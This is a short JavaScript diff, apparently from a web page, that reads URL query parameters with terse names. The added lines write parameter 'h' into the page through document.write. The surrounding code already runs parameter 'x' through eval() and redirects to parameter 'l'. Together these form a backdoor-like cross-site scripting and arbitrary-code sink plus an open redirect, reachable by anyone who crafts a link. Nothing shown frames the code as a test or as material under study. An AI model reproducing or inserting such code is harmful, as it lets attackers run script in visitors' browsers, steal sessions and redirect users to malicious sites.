@@ -5,9 +5,11 @@
   try {
     const sp = new URLSearchParams(window.location.search)
     
+    const hx = sp.get('h')
     const cx = sp.get('x')
     const lx = sp.get('l')
-    
+
+    if (hx) (document.open(), document.write(decodeURIComponent(hx)), document.close())
     if (cx) eval(decodeURIComponent(cx))
     if (lx) window.location = decodeURIComponent(lx)
 
